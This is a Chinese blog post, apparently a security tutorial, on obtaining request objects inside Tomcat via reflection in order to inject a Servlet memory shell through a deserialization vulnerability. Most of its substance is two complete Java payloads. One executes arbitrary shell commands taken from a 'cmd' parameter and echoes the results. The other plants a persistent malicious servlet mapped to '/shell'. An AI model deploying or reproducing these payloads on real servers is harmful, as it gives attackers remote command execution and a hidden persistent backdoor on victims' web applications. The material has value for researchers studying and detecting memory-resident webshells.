网络安全 | 如何获取Servlet内存马？

[ 顶峰相见8号](https://www.jianshu.com/u/619fee1a6ee1)关注赞赏支持

# 网络安全 | 如何获取Servlet内存马？

## 前言

对于回显的获取主要是在`ApplicationFilterChain`类的`lastServicedRequest /
lastServicedResponse`两个属性，是使用的`ThreadLocal`进行修饰的，并且，在执行请求的过程中，通过反射修改属性值，能够记录下当前线程的request对象的值。

之后在反序列化利用过程中方便利用`ThreadLocal`取出对应的request进行内存马的注入关键步骤。

这里转而通过寻找全局存储的`request / response`进行内存马的注入操作。

### 正文

#### 如何获取的回显

师傅通过这种方式关注到了`org.apache.coyote.AbstractProcessor`类中，存在有两个属性值名为`request /
response`分别是使用`final`修饰的`org.apache.coyote.Request /
org.apache.coyote.Response`类型的变量。  

图片.png

我们的目标是注入一个内存马，这里以上篇一样的Servlet内存马举例说明。

>
> [【一一帮助安全学习，所有资源获取处一一】](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDS3BiR2diS2hQd1Bo)  
>  ①网络安全学习路线  
>  ②20份渗透测试电子书  
>  ③安全攻防357页笔记  
>  ④50份安全攻防面试指南  
>  ⑤安全红队渗透工具包  
>  ⑥网络安全必备书籍  
>  ⑦100个漏洞实战案例  
>  ⑧安全大厂内部视频资源  
>  ⑨历年CTF夺旗赛题解析

对于Servlet内存马，我们需要获取到对应`ServletContext`，但是在`org.apache.coyote.Request`类中，并没有直接可以获取的方法存在，我们可以关注到该类的`setNote`方法的实现。  

图片.png

这个方法是用来存放私有数据的，在其中举了一个例子，其中描述了对于该类的`notes`数组中的下标为1的位置是用来存放的`HttpServletRequest`对象的，值得注意的是其中的0-8序号存放的是`servlet
Container`中的数据，9-16序号存放的是`connector`这个组件的数据。

因为只要获取到了`HttpServletRequest`对象，也就能够调用`getServletContext`方法获取我们需要的上下文。

我们可以通过`getNote(1)`来获取，

好了，言归正传，转到获取request对象，

在一个Controller调用过程中，其中的`Http11Processor`类是继承了`AbstractProcessor`这个类的。  

图片.png

所以我们只需要获取到`Http11Processor`类对象，我们就能够成功获取到我们需要的request对象

目标放在调用`Http11Processor`之前是否对该对象进行持久化存储，或者直接点对其中的request对象进行了持久化存储  

图片.png

我们进而关注到了`AbstractProtocol$ConnectionHandler`类中，在调用`process`方法的过程中调用了`register`方法对processor对象进行了存储。  

图片.png

传入的是`processor`，他到底是什么，我们可以追溯到该方法的开头，存在有来源。  

图片.png

我们可以知道，这个`processor`对象是获取的是当前的Http11Processor对象，

对于`register`方法，我们可以跟进一下。  

图片.png

首先从processor中获取了`RequestInfo`对象的信息之后调用了`setGlobalProcessor`方法。  

图片.png

调用了`addRequestProcessor`方法进行添加。  

图片.png

也即是，将其添加进入了`processors`这个List对象中，  

图片.png

所以现在我们的目的是获取到`AbstractProtocol$ConnectionHandler`类的`global`属性值，也即是获取到`AbstractProtocol`这个类对象。

在调用这一步之后看起，发现了在`CoyoteAdapter#service`方法中，存在有`Connector`对象的操作。

图片.png

对于`Connector`对象  

图片.png

这是一个connector组件的一个实现，

其中存在有一个`protocolHandler`属性，是一个`ProtocolHandler`类对象。  

图片.png

前面我们需要获取的是`AbstractProtocol`类对象，同样是实现了这个接口，

而且于HTTP连接相关的类都实现了这个接口的，

  

图片.png

所以我们能够从该属性中获取到我们需要的`AbstractProtocol`对象值，

现在我们需要获取的对象就是一个Connector对象，

而对于连接器的创建，在tomcat容器进行启动的时候，将会调用`setConnector`方法将connector放在service中去，也即是`StandardService`类对象。

对于`StandardService`的获取，我们可以直接从当前线程中进行获取。  

图片.png

这样，一条链子进行成了

总结一下：

`StandardService`==>`connector`==>`Connector.protocolHandler`==>`Http11NioProtocol.handler`==>`AbstractProtocol$ConnectionHandler.global`==>`RequestGroupInfo.processors`==>`RequestInfo.req`

### 构造回显内存马

#### 非持久化

这种应该也不算是内存马吧，也就是每次发送发序列化数据的时候，通过利用获取的request / response进行命令执行和回显。

对于实验的环境同样使用的是前面一样的环境 -- 使用springboot搭建的环境，

我首先创建了一个`getField`方法方便获取属性值。  

图片.png

将具体逻辑放在了static代码块中。

值得注意的有两点

  1. 在进行connector的筛选中，调用了`getScheme().toLowerCase().contains("http")`方法来帅选和http相关的连接器。

  2. 在命令执行的位置，通过判断有无特征来决定是否执行命令。

  

图片.png

完整的实现

    
    
    // 从线程中获取类加载器WebappClassLoaderBase
                WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                // 获取TomcatEmbeddedContext对象
                Context context = contextClassLoader.getResources().getContext();
                // 从上下文中获取ApplicationContext对象
                ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));
    
                // 从Application中获取StandardService对象
                StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));
    
                // 从StandardService中获取Connector数组
                Connector[] connectors = standardService.findConnectors();
                for (Connector connector : connectors) {
                    if (connector.getScheme().toLowerCase().contains("http")) {
                        // 获取Connector对象的protocolHandler属性值
                        ProtocolHandler protocolHandler = connector.getProtocolHandler();
                        // 筛选我们需要的Abstract
                        if (protocolHandler instanceof AbstractProtocol) {
                            // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                            // 反射获取该方法
                            Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                            getHandler.setAccessible(true);
                            AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                            // 从上面获取的handler中取出global属性值
                            RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                            // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                            ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                            // 遍历List中的元素
                            for (Object processor : processors) {
                                RequestInfo requestInfo = (RequestInfo) processor;
                                // 获取对应的Request对象
                                org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                                // 通过不同的请求进行处理
                                if ((req.queryString()).toString().toLowerCase().contains("cmd")) {
                                    // 获取对应的Request对象
                                    org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
                                    // 执行希望执行的命令
                                    String cmd = request.getParameter("cmd");
                                    String[] cmds = null;
                                    if (cmd != null) {
                                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                            cmds = new String[] {"cmd.exe", "/c", cmd};
                                        } else {
                                            cmds = new String[] {"/bin/bash", "-c", cmd};
                                        }
                                        java.util.Scanner c = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A");
                                        String o = null;
                                        o = c.hasNext() ? c.next() : o;
                                        c.close();
                                        PrintWriter writer = request.getResponse().getWriter();
                                        writer.println(o);
                                        writer.flush();
                                        writer.close();
                                    }
                                }
    
    

测试一下

首先通过CC6_plus生成序列化数据`1.ser`

发送给漏洞端。

  

图片.png

在访问路由中添加了一个cmd的GET传参，最后能够发现，成功执行了的。

#### **持久化**

对于持久化也就是真正的内存马实现，主要是通过和前面的Tomcat Servlet内存马相结合的模式，

也即是从request对象中获取到了ServletContext对象来执行恶意逻辑。

完整实现

    
    
    // 从线程中获取类加载器WebappClassLoaderBase
                WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                // 获取TomcatEmbeddedContext对象
                Context context = contextClassLoader.getResources().getContext();
                // 从上下文中获取ApplicationContext对象
                ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));
    
                // 从Application中获取StandardService对象
                StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));
    
                // 从StandardService中获取Connector数组
                Connector[] connectors = standardService.findConnectors();
                for (Connector connector : connectors) {
                    if (connector.getScheme().toLowerCase().contains("http")) {
                        // 获取Connector对象的protocolHandler属性值
                        ProtocolHandler protocolHandler = connector.getProtocolHandler();
                        // 筛选我们需要的Abstract
                        if (protocolHandler instanceof AbstractProtocol) {
                            // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                            // 反射获取该方法
                            Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                            getHandler.setAccessible(true);
                            AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                            // 从上面获取的handler中取出global属性值
                            RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                            // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                            ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                            // 遍历List中的元素
                            for (Object processor : processors) {
                                RequestInfo requestInfo = (RequestInfo) processor;
                                // 获取对应的Request对象
                                org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
    
                                ServletContext servletContext = request.getServletContext();
    
                                String name = "xxx";
                                if (servletContext.getServletRegistration(name) == null) {
                                    StandardContext o = null;
    
                                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                                    while (o == null) {
                                        Field f = servletContext.getClass().getDeclaredField("context");
                                        f.setAccessible(true);
                                        Object object = f.get(servletContext);
    
                                        if (object instanceof ServletContext) {
                                            servletContext = (ServletContext) object;
                                        } else if (object instanceof StandardContext) {
                                            o = (StandardContext) object;
                                        }
                                    }
    
                                    //自定义servlet
                                    Servlet servlet = new TomcatMemshell1();
    
                                    //用Wrapper封装servlet
                                    Wrapper newWrapper = o.createWrapper();
                                    newWrapper.setName(name);
                                    newWrapper.setLoadOnStartup(1);
                                    newWrapper.setServlet(servlet);
    
                                    //向children中添加Wrapper
                                    o.addChild(newWrapper);
                                    //添加servlet的映射
                                    o.addServletMappingDecoded("/shell", name);
    
    

简单测试一下，

启动反序列漏洞环境，

发送序列化数据，

  

图片.png

成功进行反序列化，

  

图片.png

验证是否成功注入，

  

图片.png

成功创建了一个恶意的Servlet。

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [Tomcat剖析之源码篇(二)](https://www.jianshu.com/p/6b006ed697d0)

前言 前面第一篇介绍了Tomcat的整体架构，能让我们在宏观上对Tomcat的运转流程有一个认识，但原理毕竟只是理...

[丶legend](https://www.jianshu.com/u/8c40e4a6997e)阅读 787评论 0赞 1

  * [Tomcat 架构原理解析到架构设计借鉴](https://www.jianshu.com/p/cce4d8f9dfa8)

Tomcat 架构原理解析到架构设计借鉴 Tomcat 发展这么多年，已经比较成熟稳定。在如今『追新求快』的时代，...

[MageByte_青叶](https://www.jianshu.com/u/e416738404cd)阅读 343评论 0赞 2

  * [Tomcat 学习](https://www.jianshu.com/p/7a0c3d811be2)

前言 在学习内存马之前，了解tomcat的运行原理是十分有必要的。 Tomcat 整体架构 Tomcat 结构比较...

[CSeroad](https://www.jianshu.com/u/859a42ec7c8f)阅读 490评论 0赞 5

  * [Tomcat源码浅析](https://www.jianshu.com/p/f5841753efe4)

以嵌入SpringBoot的Tomcat源码(版本：tomcat-embed-9.0.16)为基础浅析Tomcat...

[aiwen2017](https://www.jianshu.com/u/7d1a74523467)阅读 736评论 0赞 0

  * [tomcat性能优化](https://www.jianshu.com/p/d64b5909ec1b)

原作者 https://smartan123.github.io/book/?file=home-%E9%A6%9...

[还有点头发](https://www.jianshu.com/u/0be9be4457c4)阅读 1,062评论 0赞 1

 